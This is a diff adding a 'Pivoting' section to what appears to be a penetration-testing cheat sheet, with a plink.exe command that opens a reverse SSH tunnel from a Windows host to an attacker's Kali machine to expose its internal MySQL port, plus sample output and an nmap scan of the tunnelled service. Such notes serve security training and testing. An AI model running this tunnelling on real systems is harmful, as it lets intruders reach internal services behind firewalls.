@@ -83,6 +83,20 @@ Format of Hashes:
 
 Ref: https://techgenix.com/how-cracked-windows-password-part2/
 
+### Pivoting
+```
+----------PLINK.EXE----------
+cmd.exe /c echo y | plink.exe -ssh -l [KALI_USERNAME] -pw [KALI_PASSWORD] -R [KALI_IP]:[KALI_PORT]:127.0.0.1:3306 [KALI_IP]
+# C:\Tools\port_redirection_and_tunneling> cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+# kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 1234
+# Starting Nmap 7.60 ( https://nmap.org ) at 2019-04-20 05:00 EEST
+# Nmap scan report for localhost (127.0.0.1)
+# Host is up (0.00026s latency).
+# PORT STATE SERVICE VERSION
+# 1234/tcp open mysql MySQL 5.5.5-10.1.31-MariaDB
+# Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
+```
+
 ### Active Directory & LDAP
 
 #### Enum
